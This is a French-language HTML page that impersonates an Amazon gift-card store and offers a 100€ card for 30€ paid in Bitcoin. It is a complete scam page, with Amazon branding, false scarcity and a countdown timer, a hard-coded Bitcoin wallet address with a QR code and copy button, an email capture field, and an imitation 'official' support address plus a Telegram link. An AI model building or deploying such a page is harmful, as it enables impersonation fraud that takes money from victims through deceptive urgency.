<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Achat de Carte Amazon 100€</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #232F3E;
            color: white;
        }
        .container {
            max-width: 600px;
            margin: auto;
            padding: 20px;
            background-color: #FF9900;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
        }
        input, button {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
        }
        button {
            background-color: #232F3E;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }
        button:hover {
            background-color: #131A22;
        }
        .logo {
            width: 200px;
            margin-bottom: 20px;
        }
        .gift-card {
            width: 100%;
            max-width: 400px;
            margin: 20px 0;
        }
        .stock-info, .countdown {
            font-weight: bold;
            color: red;
        }
        .qr-code {
            width: 150px;
            margin-top: 10px;
        }
        .support {
            margin-top: 20px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://ereputation-dereferencement.fr/wp-content/uploads/2021/01/Amazon-logo.png" alt="Amazon Logo" class="logo">
        <h2>Acheter une Carte Cadeau Amazon 100€</h2>
        <img src="https://www.cartecadeau.carrefour.fr/data/filemanager/cms/1%20(4).png" alt="Carte Amazon" class="gift-card">
        <p class="stock-info">⚠️ Seulement 3 cartes restantes à ce prix !</p>
        <p class="countdown">Offre spéciale : Expire dans <span id="timer">20:00</span> minutes !</p>
        <p>Prix : <strong>30€ en Bitcoin</strong></p>
        <p>Entrez votre email pour recevoir la carte :</p>
        <input type="email" id="email" placeholder="Votre email">
        <button onclick="confirmEmail()">Confirmer l'email</button>
        <p id="emailConfirmation" style="display:none; color: green; font-weight: bold;">Email confirmé !</p>
        <h3>Envoyez le paiement en Bitcoin :</h3>
        <p>Adresse BTC : <strong id="btcAddress">bc1qzqnv98u43ed0gkuqr5tmjvgnvpy08t7hh780kd</strong></p>
        <img src="https://www.bitcoinqrcodemaker.com/api/?style=bitcoin&address=bc1qzqnv98u43ed0gkuqr5tmjvgnvpy08t7hh780kd" alt="QR Code Bitcoin" class="qr-code">
        <button onclick="copyAddress()">Copier l'Adresse</button>
        <div class="support">
            <p>💬 Besoin d'aide ? Contactez-nous :</p>
            <p>Email : support@amazon-giftcards-official.com</p>
            <p>Telegram : <a href="https://t.me/+hxyRrXnt5opkMzg0" target="_blank">Rejoignez notre canal Telegram</a></p>
        </div>
    </div>
    
    <script>
        function copyAddress() {
            navigator.clipboard.writeText(document.getElementById("btcAddress").textContent);
            alert("Adresse copiée dans le presse-papier !");
        }

        function confirmEmail() {
            let email = document.getElementById("email").value;
            if (email.includes("@") && email.includes(".")) {
                document.getElementById("emailConfirmation").style.display = "block";
            } else {
                alert("Veuillez entrer un email valide.");
            }
        }

        function startCountdown(duration) {
            let timer = duration, minutes, seconds;
            setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);
                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;
                document.getElementById("timer").textContent = minutes + ":" + seconds;
                if (--timer < 0) {
                    document.querySelector(".countdown").textContent = "Offre expirée !";
                }
            }, 1000);
        }
        startCountdown(1200); 
    </script>
</body>
</html>
